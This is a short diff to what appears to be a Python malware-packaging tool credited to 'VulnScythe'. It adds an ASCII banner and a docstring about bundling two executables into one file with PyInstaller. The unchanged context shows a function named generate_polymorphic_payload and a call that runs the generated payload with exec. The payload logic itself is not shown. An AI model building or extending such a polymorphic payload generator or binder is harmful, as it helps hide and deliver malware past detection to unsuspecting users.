@@ -1,6 +1,20 @@
 import base64
 import random
 import bz2
+"""
+This tool uses PyInstaller to package both executables into a single distributable file.
+
+░██    ░██            ░██              ░██████                            ░██    ░██                   
+░██    ░██            ░██             ░██   ░██                           ░██    ░██                   
+░██    ░██ ░██    ░██ ░██ ░████████  ░██          ░███████  ░██    ░██ ░████████ ░████████   ░███████  
+░██    ░██ ░██    ░██ ░██ ░██    ░██  ░████████  ░██    ░██ ░██    ░██    ░██    ░██    ░██ ░██    ░██ 
+ ░██  ░██  ░██    ░██ ░██ ░██    ░██         ░██ ░██        ░██    ░██    ░██    ░██    ░██ ░█████████ 
+  ░██░██   ░██   ░███ ░██ ░██    ░██  ░██   ░██  ░██    ░██ ░██   ░███    ░██    ░██    ░██ ░██        
+   ░███     ░█████░██ ░██ ░██    ░██   ░██████    ░███████   ░█████░██     ░████ ░██    ░██  ░███████  
+                                                                   ░██                                 
+                                                             ░███████                                  
+Credits:  https://github.com/VulnScythe                                                                                                                                                                                                          
+"""
 
 def generate_polymorphic_payload(original_payload):
     try:
@@ -44,4 +58,5 @@ if polymorphic_payload:
 
     exec(polymorphic_payload)
 else:
+
     print("Failed to generate polymorphic payload.")
